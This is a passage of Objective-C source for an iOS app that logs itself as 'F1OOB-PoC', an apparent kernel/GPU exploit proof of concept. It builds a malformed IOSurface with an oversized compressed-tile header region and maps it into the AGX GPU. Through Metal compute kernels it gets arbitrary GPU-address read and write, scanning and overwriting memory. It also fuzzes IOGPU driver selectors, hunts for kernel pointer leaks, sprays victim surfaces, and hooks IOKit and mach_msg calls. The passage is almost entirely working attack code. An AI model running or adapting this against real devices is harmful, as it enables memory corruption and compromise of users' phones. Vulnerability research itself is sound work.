            id<MTLComputeCommandEncoder> qe = [qb computeCommandEncoder];
            [qe setComputePipelineState:prd64];
            [qe setBuffer:f1buf offset:0 atIndex:0];
            [qe setBuffer:out offset:0 atIndex:1];
            [qe setBytes:&d length:8 atIndex:2];
            [qe dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [qe endEncoding];
            [qb commit];
            [qb waitUntilCompleted];
            uint64_t qv = 0;
            if (out.contents) memcpy(&qv, out.contents, 8);
            L(@"[QUEUE] read q550 status=%lu value=0x%llx err=%@",
              (unsigned long)qb.status, (unsigned long long)qv, qb.error);
        }
    }

    if (iogpu_conn) IOServiceClose(iogpu_conn);
    // Scan GPU VA windows around the F1 base for mapped pages. A mapped page
    // returns data; an unmapped page reads as 0. This finds device shmem /
    // firmware / other resource mappings in this UAT context.
    if (prd64) {
        uint64_t (^gread)(uint64_t) = ^uint64_t(uint64_t target) {
            int64_t d = (int64_t)(target - f1ga);
            id<MTLCommandBuffer> rb = [q commandBuffer];
            id<MTLComputeCommandEncoder> re = [rb computeCommandEncoder];
            [re setComputePipelineState:prd64];
            [re setBuffer:f1buf offset:0 atIndex:0];
            [re setBuffer:out offset:0 atIndex:1];
            [re setBytes:&d length:8 atIndex:2];
            [re dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
            [re endEncoding];
            [rb commit];
            [rb waitUntilCompleted];
            uint64_t v = 0;
            if (rb.status != MTLCommandBufferStatusError && out.contents)
                memcpy(&v, out.contents, 8);
            return v;
        };
        int hits = 0;
        for (uint64_t off = 0x10000; off < 0x400000; off += 0x1000) {
            uint64_t va = f1ga + off;
            uint64_t v = gread(va);
            if (v) { L(@"[GSCAN] +0x%llx va=0x%llx = 0x%016llx", (unsigned long long)off,
                        (unsigned long long)va, (unsigned long long)v); if (++hits > 64) break; }
        }
        for (uint64_t off = 0x1000; off <= 0x200000; off += 0x1000) {
            uint64_t va = f1ga - off;
            uint64_t v = gread(va);
            if (v) { L(@"[GSCAN] -0x%llx va=0x%llx = 0x%016llx", (unsigned long long)off,
                        (unsigned long long)va, (unsigned long long)v); if (++hits > 64) break; }
        }
        for (uint64_t off = 0; off < 0x100000; off += 0x1000) {
            uint64_t va = 0x13400000000ULL + off;
            uint64_t v = gread(va);
            if (v) { L(@"[GSCAN] ttbat+0x%llx va=0x%llx = 0x%016llx", (unsigned long long)off,
                        (unsigned long long)va, (unsigned long long)v); if (++hits > 64) break; }
        }
        {
            uint64_t pages[] = {0xc4000, 0xc5000, 0x148000};
            for (int pi = 0; pi < 3; pi++) {
                uint64_t base_off = pages[pi];
                L(@"[GDUMP] page +0x%llx", (unsigned long long)base_off);
                for (uint64_t o = 0; o < 0x200; o += 8) {
                    uint64_t v = gread(f1ga + base_off + o);
                    if (v) L(@"[GDUMP]   +0x%03llx = 0x%016llx",
                             (unsigned long long)o, (unsigned long long)v);
                }
            }
        }
        if (pwr64) {
            void (^gwrite)(uint64_t, uint64_t) = ^(uint64_t target, uint64_t val) {
                int64_t d = (int64_t)(target - f1ga);
                id<MTLCommandBuffer> wb = [q commandBuffer];
                id<MTLComputeCommandEncoder> we = [wb computeCommandEncoder];
                [we setComputePipelineState:pwr64];
                [we setBuffer:f1buf offset:0 atIndex:0];
                [we setBytes:&d length:8 atIndex:1];
                [we setBytes:&val length:8 atIndex:2];
                [we dispatchThreadgroups:MTLSizeMake(1,1,1) threadsPerThreadgroup:MTLSizeMake(1,1,1)];
                [we endEncoding];
                [wb commit];
                [wb waitUntilCompleted];
            };
            int mapped = 0;
            uint64_t ranges[5][3] = {
                {f1ga + 0x10000, 0x400000, 0x1000},
                {f1ga - 0x200000, 0x200000, 0x1000},
                {0x13400000000ULL, 0x100000, 0x1000},
                {f1ga + 0x400000, 0x4000000, 0x10000},
                {0x13400000000ULL + 0x100000, 0x1000000, 0x10000},
            };
            for (int r = 0; r < 5; r++) {
                uint64_t start = ranges[r][0], len = ranges[r][1], step = ranges[r][2];
                for (uint64_t o = 0; o < len; o += step) {
                    uint64_t va = start + ((r == 1) ? o : o);
                    if (r == 1) va = f1ga - 0x200000 + o;
                    uint64_t orig = gread(va);
                    uint64_t marker = 0x4d41504d00000000ULL | (o & 0xffff);
                    gwrite(va, marker);
                    uint64_t back = gread(va);
                    if (back == marker) {
                        L(@"[MAPPED] va=0x%llx orig=0x%016llx", (unsigned long long)va,
                          (unsigned long long)orig);
                        gwrite(va, orig);
                        if (++mapped > 96) break;
                    }
                }
            }
            L(@"[MAPPED] total=%d", mapped);
        }
        L(@"[GSCAN] hits=%d", hits);
    }

    L(@"[METAL] done");
}

static NSString *f1_xml_sz(uint32_t sz) {
    NSString *t =
    @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    "<plist version=\"1.0\"><dict>"
    "<key>IOSurfaceWidth</key><integer>64</integer>"
    "<key>IOSurfaceHeight</key><integer>64</integer>"
    "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    "<key>IOSurfaceAllocSize</key><integer>%u</integer>"
    "<key>IOSurfaceSliceCount</key><integer>4</integer>"
    "<key>IOSurfacePlaneInfo</key><array><dict>"
    "<key>IOSurfacePlaneWidth</key><integer>64</integer>"
    "<key>IOSurfacePlaneHeight</key><integer>64</integer>"
    "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
    "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
    "<key>IOSurfacePlaneSize</key><integer>%u</integer>"
    "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
    "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
    "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
    "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
    "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
    "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
    "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
    "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>"
    "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>"
    "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>%u</integer>"
    "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
    "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer>"
    "</dict></array></dict></plist>\n";
    return [NSString stringWithFormat:t, sz, sz, sz];
}

static void span_sweep(io_connect_t conn) {
    uint32_t sizes[] = {0x10000, 0x40000, 0x100000, 0x400000, 0x1000000, 0x4000000};
    for (unsigned i = 0; i < sizeof(sizes)/sizeof(sizes[0]); i++) {
        uint32_t sz = sizes[i];
        uint32_t sid = create_surface(conn, f1_xml_sz(sz), "SZ");
        if (!sid) { L(@"[SPAN] sz=0x%x surface rejected", sz); continue; }
        uint64_t span = 0; io_connect_t ac = 0;
        uint64_t ga = agx_map(sid, &span, &ac);
        L(@"[SPAN] sz=0x%x sid=%u gpuVA=0x%llx span=0x%llx", sz, sid,
          (unsigned long long)ga, (unsigned long long)span);
        if (ac) IOServiceClose(ac);
    }
}

static void queue_submit_probe(io_connect_t c0, const char *tag) {
    io_connect_t c = c0;
    io_connect_t ic = 0;
    io_service_t isvc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPU"));
    if (isvc) {
        if (IOServiceOpen(isvc, mach_task_self(), 1, &ic) == KERN_SUCCESS && ic) c = ic;
        IOObjectRelease(isvc);
    }
    L(@"[SUB] %s using conn=0x%x", tag, c);
    if (!c) return;
    uint8_t qin[0x410]; memset(qin, 0, sizeof(qin));
    uint8_t qout[0x10]; memset(qout, 0, sizeof(qout)); size_t qsz = sizeof(qout);
    kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, qin, 0x410, NULL, NULL, qout, &qsz);
    uint64_t qid = rd64(qout);
    L(@"[SUB] %s sel6 -> 0x%x qid=0x%llx serial=0x%llx", tag, kr,
      (unsigned long long)qid, (unsigned long long)rd64(qout + 8));
    if (kr != KERN_SUCCESS || !qid) return;

    uint64_t s46[1] = {qid}, o46[2] = {0, 0}; uint32_t oc46 = 2;
    kern_return_t k46 = IOConnectCallMethod(c, 46, s46, 1, NULL, 0, o46, &oc46, NULL, NULL);
    L(@"[SUB] %s sel46 -> 0x%x cb=0x%llx f=0x%llx", tag, k46,
      (unsigned long long)o46[0], (unsigned long long)o46[1]);

    uint8_t *entry = calloc(1, 0x30);
    void *ub = NULL; posix_memalign(&ub, 0x4000, 0x4000); memset(ub, 0x5A, 0x4000);
    uint64_t v0[] = {0, 1, 0x1500000000ULL};
    uint64_t v8[] = {0, 0x1000, 0x4000};
    uint64_t v10[] = {0, 1, 0x1500000000ULL};
    uint64_t v18[] = {0, 0x1500000000ULL, 0x15000a8000ULL, (uint64_t)(uintptr_t)ub};
    uint32_t v20[] = {0, 1, 2};
    int hits = 0;
    for (unsigned a = 0; a < 3; a++)
    for (unsigned b = 0; b < 3; b++)
    for (unsigned c = 0; c < 3; c++)
    for (unsigned d = 0; d < 4; d++)
    for (unsigned e = 0; e < 3; e++) {
        memset(entry, 0, 0x30);
        *(uint64_t *)(entry + 0x00) = v0[a];
        *(uint64_t *)(entry + 0x08) = v8[b];
        *(uint64_t *)(entry + 0x10) = v10[c];
        *(uint64_t *)(entry + 0x18) = v18[d];
        *(uint32_t *)(entry + 0x20) = v20[e];
        uint64_t s25[4] = {qid, 0, 1, 0x30};
        uint64_t out = 0; uint32_t oc = 1;
        kern_return_t kr = IOConnectCallMethod(c, 25, s25, 4, entry, 0x30, &out, &oc, NULL, NULL);
        if (kr != 0xe00002c2) {
            L(@"[SUB] %s HIT a=%llx b=%llx c=%llx d=%llx e=%u -> 0x%x out=0x%llx",
              tag, (unsigned long long)v0[a], (unsigned long long)v8[b],
              (unsigned long long)v10[c], (unsigned long long)v18[d], v20[e], kr,
              (unsigned long long)out);
            if (++hits > 20) break;
        }
    }
    L(@"[SUB] %s fuzz done hits=%d", tag, hits);
    free(entry); free(ub);
    if (ic) IOServiceClose(ic);
}

static void info_probe2(io_connect_t c, const char *tag) {
    if (!c) return;
    struct { int sel; int sc; size_t si; size_t so; } rows[] = {
        {16,0,0,8},{17,0,0,4},{19,1,0,0x18},{21,0,0,0x30},
        {26,1,0xc,0},{27,1,4,0},{34,1,0,0},{54,2,0,0},
        {28,0,0,0},{31,1,0,0},{36,3,0,0},
    };
    for (unsigned i = 0; i < sizeof(rows)/sizeof(rows[0]); i++) {
        uint64_t sv[4] = {1, 1, 1, 1};
        uint8_t sin[0x40]; memset(sin, 0, sizeof(sin));
        uint8_t sout[0x100]; memset(sout, 0, sizeof(sout)); size_t osz = sizeof(sout);
        uint64_t so[2] = {0, 0}; uint32_t soc = 2;
        kern_return_t kr = IOConnectCallMethod(c, rows[i].sel, sv, rows[i].sc,
            rows[i].si ? sin : NULL, rows[i].si,
            so, &soc, rows[i].so ? sout : NULL, rows[i].so ? &osz : NULL);
        L(@"[INFO2] %s sel=%d -> 0x%x osz=0x%zx so=0x%llx,0x%llx", tag, rows[i].sel,
          kr, osz, (unsigned long long)so[0], (unsigned long long)so[1]);
        if (kr == KERN_SUCCESS) {
            for (size_t o = 0; o + 8 <= osz; o += 8) {
                uint64_t v = rd64(sout + o);
                if ((v >> 40) == 0xffffff || (v >> 32) == 0xfffffff0)
                    L(@"[INFO2] %s sel=%d +0x%zx = 0x%016llx", tag, rows[i].sel, o,
                      (unsigned long long)v);
            }
        }
    }
}

static void sysmem_type0_probe(io_connect_t c, const char *tag) {
    if (!c) return;
    void *ub = NULL;
    if (posix_memalign(&ub, 0x4000, 0x4000) != 0 || !ub) return;
    memset(ub, 0x5A, 0x4000);
    for (int pat = 0; pat < 3; pat++) {
        uint8_t in[0x100]; memset(in, 0, sizeof(in));
        *(uint32_t *)(in + 0x00) = 0x00;                     // resType 0
        *(uint64_t *)(in + 0x20) = (uint64_t)(uintptr_t)ub;  // client address
        *(uint64_t *)(in + 0x28) = 0x4000;                   // client size
        *(uint64_t *)(in + 0x30) = (pat == 1) ? 3 : 0;       // protection
        *(uint64_t *)(in + 0x48) = 0x4000;                   // size
        if (pat == 2) *(uint8_t *)(in + 0x16) = 0x20;        // alternate branch
        uint8_t out[0x1000]; memset(out, 0, sizeof(out)); size_t osz = sizeof(out);
        kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
        uint32_t rid = rd32(out + 0x24);
        L(@"[T0] %s pat=%d -> 0x%x va=0x%llx span=0x%llx rid=%u", tag, pat, kr,
          (unsigned long long)rd64(out), (unsigned long long)rd64(out + 0x28), rid);
        if (kr == KERN_SUCCESS && rid) {
            uint64_t s37[1] = {rid};
            kern_return_t k2 = IOConnectCallScalarMethod(c, 37, s37, 1, NULL, NULL);
            L(@"[T0] %s detach rid=%u -> 0x%x", tag, rid, k2);
        }
    }
    free(ub);
}

static void virtmem_probe(io_connect_t c, const char *tag) {
    if (!c) return;
    uint8_t in[0x100]; memset(in, 0, sizeof(in));
    uint8_t out[0x1000]; size_t osz;
    uint64_t lens[] = {0x4000, 0x100000, 0x1000000};
    uint32_t pgs[] = {0x1000, 0x4000, 0x10000};
    uint64_t addrs[] = {0, 0x100000000ULL, 0x11F00000000ULL, 0x11E00000000ULL,
                        0x11F80000000ULL, 0x12000000000ULL, 0x13400000000ULL};
    uint64_t bases[] = {0, 0x4000, 0x100000};
    for (unsigned li = 0; li < 1; li++)
    for (unsigned pi = 0; pi < 1; pi++)
    for (unsigned ai = 0; ai < 7; ai++)
    for (unsigned bi = 0; bi < 1; bi++) {
        memset(in, 0, sizeof(in));
        *(uint32_t *)(in + 0x00) = 0x40;
        *(uint64_t *)(in + 0x18) = 0;
        *(uint64_t *)(in + 0x38) = lens[li];
        *(uint64_t *)(in + 0x40) = addrs[ai];
        *(uint64_t *)(in + 0x48) = bases[bi];
        *(uint32_t *)(in + 0x50) = pgs[pi];
        memset(out, 0, sizeof(out)); osz = sizeof(out);
        kern_return_t kr = IOConnectCallMethod(c, 8, NULL, 0, in, 0x100, NULL, NULL, out, &osz);
        if (kr == 0)
            L(@"[VMEM] %s len=0x%llx pg=0x%x A=0x%llx B=0x%llx -> 0x%x va=0x%llx span=0x%llx rid=%u",
              tag, (unsigned long long)lens[li], pgs[pi], (unsigned long long)addrs[ai],
              (unsigned long long)bases[bi], kr, (unsigned long long)rd64(out),
              (unsigned long long)rd64(out + 0x28), rd32(out + 0x24));
        else if (kr != 0xe00002be && kr != 0xe00002c2)
            L(@"[VMEM] %s len=0x%llx pg=0x%x A=0x%llx B=0x%llx -> 0x%x",
              tag, (unsigned long long)lens[li], pgs[pi], (unsigned long long)addrs[ai],
              (unsigned long long)bases[bi], kr);
    }
}

static uint64_t g_stamp_cpuva;

static void pre_queue_probe(io_connect_t c) {
    if (!c) return;
    uint64_t s14[2] = {0x10, 0x10};
    uint8_t o14[0x10]; memset(o14, 0, sizeof(o14)); size_t osz = sizeof(o14);
    kern_return_t kr = IOConnectCallMethod(c, 14, s14, 2, NULL, 0, NULL, NULL, o14, &osz);
    g_stamp_cpuva = rd64(o14);
    L(@"[PREQ] sel14 -> 0x%x cpuva=0x%llx", kr, (unsigned long long)g_stamp_cpuva);
    if (g_stamp_cpuva) {
        uint8_t tmp[0x40]; mach_vm_size_t got = 0;
        kern_return_t rr = mach_vm_read_overwrite(mach_task_self(),
            (mach_vm_address_t)g_stamp_cpuva, 0x40, (mach_vm_address_t)tmp, &got);
        if (rr == KERN_SUCCESS) {
            for (int i = 0; i < 8; i++)
                L(@"[PREQ] stamp cpu +0x%02x = 0x%016llx", i*8,
                  (unsigned long long)rd64(tmp + i*8));
        }
    }
    uint64_t s42[2] = {0,0}, o42[2] = {0,0}; uint32_t oc = 2;
    kr = IOConnectCallMethod(c, 42, s42, 2, NULL, 0, o42, &oc, NULL, NULL);
    L(@"[PREQ] sel42 -> 0x%x qid=0x%llx", kr, (unsigned long long)o42[0]);
    if (kr == KERN_SUCCESS && o42[0]) {
        uint64_t qid = o42[0];
        uint32_t nid = (uint32_t)(g_stamp_cpuva ? 1 : 1);
        uint64_t s44[2] = {qid, nid};
        kr = IOConnectCallMethod(c, 44, s44, 2, NULL, 0, NULL, NULL, NULL, NULL);
        L(@"[PREQ] sel44 -> 0x%x", kr);
        uint64_t s46[1] = {qid}, o46[2] = {0,0}; uint32_t oc46 = 2;
        kr = IOConnectCallMethod(c, 46, s46, 1, NULL, 0, o46, &oc46, NULL, NULL);
        L(@"[PREQ] sel46 -> 0x%x cb=0x%llx f=0x%llx", kr,
          (unsigned long long)o46[0], (unsigned long long)o46[1]);
    }
}

static void leak_probe(io_connect_t c, const char *tag) {
    if (!c) return;
    int sels[] = {0,1,2,3,4,5,16,17,19,21,26,27,34,54};
    for (unsigned i = 0; i < sizeof(sels)/sizeof(sels[0]); i++) {
        for (int sc = 0; sc <= 1; sc++) {
            uint64_t sv[2] = {0, 0};
            uint8_t out[0x1000]; memset(out, 0, sizeof(out)); size_t osz = sizeof(out);
            kern_return_t kr = IOConnectCallMethod(c, sels[i], sv, sc, NULL, 0,
                                                   NULL, NULL, out, &osz);
            if (kr != 0) { if (sc == 1) break; continue; }
            int found = 0;
            for (size_t o = 0; o + 8 <= osz; o += 8) {
                uint64_t v = rd64(out + o);
                if ((v >> 40) == 0xffffff || (v >> 32) == 0xfffffff0 ||
                    (v >> 40) == 0xfffff0) {
                    L(@"[LEAK] %s sel=%d sc=%d osz=0x%zx +0x%zx = 0x%016llx",
                      tag, sels[i], sc, osz, o, (unsigned long long)v);
                    found++;
                }
            }
            if (!found)
                L(@"[LEAK] %s sel=%d sc=%d osz=0x%zx first=0x%016llx 0x%016llx",
                  tag, sels[i], sc, osz, (unsigned long long)rd64(out),
                  (unsigned long long)rd64(out + 8));
            break;
        }
    }
}

static void queue_early_probe(void) {
    const char *names[] = {"IOGPU", "AGXAcceleratorG14P"};
    for (unsigned i = 0; i < 2; i++) {
        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching(names[i]));
        if (!svc) { L(@"[QEARLY] %s absent", names[i]); continue; }
        io_connect_t c = 0;
        kern_return_t okr = IOServiceOpen(svc, mach_task_self(), 1, &c);
        IOObjectRelease(svc);
        L(@"[QEARLY] %s open type1 -> 0x%x conn=0x%x", names[i], okr, c);
        if (okr != KERN_SUCCESS || !c) continue;
        uint8_t *buf = calloc(1, 0x800);
        uint32_t sizes[] = {0x408, 0x410, 0x400, 0x420};
        for (unsigned si = 0; si < 4; si++) {
            for (int pri = 0; pri < 3; pri++) {
                memset(buf, 0, 0x800);
                *(uint32_t *)(buf + 0x400) = pri;
                uint8_t out[0x10]; memset(out, 0, sizeof(out)); size_t osz = sizeof(out);
                kern_return_t kr = IOConnectCallMethod(c, 6, NULL, 0, buf, sizes[si],
                                                       NULL, NULL, out, &osz);
                L(@"[QEARLY] %s sz=0x%x pri=%d -> 0x%x osz=0x%zx id=0x%llx q550=0x%llx",
                  names[i], sizes[si], pri, kr, osz, (unsigned long long)rd64(out),
                  (unsigned long long)rd64(out + 8));
            }
        }
        leak_probe(c, names[i]);
        free(buf);
        IOServiceClose(c);
    }
}

static void run(void) {
    struct utsname un;
    uname(&un);
    L(@"=== F1OOB-PoC start ===");
    struct rebinding rebs[5] = {
        {"IOConnectCallMethod", (void *)hook_iocm, (void **)&g_orig_iocm},
        {"IOConnectCallStructMethod", (void *)hook_iocms, (void **)&g_orig_iocms},
        {"IOConnectCallScalarMethod", (void *)hook_iocmsc, (void **)&g_orig_iocmsc},
        {"mach_msg", (void *)hook_mach_msg, (void **)&g_orig_mach_msg},
        {"mach_msg_overwrite", (void *)hook_mach_msg_ow, (void **)&g_orig_mach_msg_ow},
    };
    int rbr = rebind_symbols(rebs, 5);
    L(@"[HOOK] rebind_symbols -> %d", rbr);
    queue_early_probe();
    L(@"device=%s version=%s", un.machine, un.version);

    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[F1] no IOSurfaceRoot"); return; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    L(@"[F1] IOSurfaceRoot open=0x%x conn=0x%x", kr, conn);
    if (kr != KERN_SUCCESS) return;

    span_sweep(conn);
    uint32_t ctrl_sid = create_surface(conn, normal_xml(), "CTRL");
    uint32_t sid = create_surface(conn, f1_xml(), "F1");
    if (!sid) { L(@"[F1] F1 surface rejected"); IOServiceClose(conn); return; }

    IOSurfaceRef surf = IOSurfaceLookup(sid);
    if (!surf) { L(@"[F1] IOSurfaceLookup(%u) failed", sid); IOServiceClose(conn); return; }
    void *base = IOSurfaceGetBaseAddress(surf);
    size_t alloc = IOSurfaceGetAllocSize(surf);
    L(@"[F1] id=%u base=%p alloc=0x%zx planes=%zu",
      sid, base, alloc, IOSurfaceGetPlaneCount(surf));
    if (base) {
        size_t planes = IOSurfaceGetPlaneCount(surf);
        for (size_t i = 0; i < planes && i < 4; i++) {
            void *pb = IOSurfaceGetBaseAddressOfPlane(surf, i);
            L(@"[F1] plane[%zu] base=%p bpr=%zu h=%zu", i, pb,
              IOSurfaceGetBytesPerRowOfPlane(surf, i),
              IOSurfaceGetHeightOfPlane(surf, i));
        }
    }

    IOSurfaceRef ios_victims[32];
    int ivc = create_iosurface_victims(ios_victims, 32);

    uint64_t agx_span = 0;
    io_connect_t agx_conn = 0;
    uint64_t agx_va = agx_map(sid, &agx_span, &agx_conn);

    pre_queue_probe(agx_conn);
    metal_cross_object_write(surf, agx_va, agx_span, agx_conn);

    if (agx_conn) IOServiceClose(agx_conn);
    for (int i = 0; i < ivc; i++) CFRelease(ios_victims[i]);
    CFRelease(surf);
    (void)ctrl_sid;
    IOServiceClose(conn);
    L(@"=== F1OOB-PoC done ===");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *tv;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    gLog = [NSMutableString new];
    NSString *docs = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    gDir = [docs stringByAppendingPathComponent:@"F1OOB-PoC"];
    [[NSFileManager defaultManager] createDirectoryAtPath:gDir
                              withIntermediateDirectories:YES
                                               attributes:nil
                                                    error:nil];
    NSDateFormatter *df = [NSDateFormatter new];
    df.dateFormat = @"yyyyMMdd-HHmmss";
    gLogPath = [gDir stringByAppendingPathComponent:
                [NSString stringWithFormat:@"run-%@.log", [df stringFromDate:[NSDate date]]]];
    [gLog writeToFile:gLogPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    [gLog writeToFile:[gDir stringByAppendingPathComponent:@"latest.log"]
            atomically:YES encoding:NSUTF8StringEncoding error:nil];

    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [UIViewController new];
    self.tv = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.tv.editable = NO;
    self.tv.font = [UIFont monospacedSystemFontOfSize:10 weight:UIFontWeightRegular];
    [vc.view addSubview:self.tv];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
            @autoreleasepool { run(); }
            dispatch_async(dispatch_get_main_queue(), ^{
                pthread_mutex_lock(&gLock);
                self.tv.text = [gLog copy];
                pthread_mutex_unlock(&gLock);
            });
        });
    });
    return YES;
}
@end

int main(int argc, char **argv) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
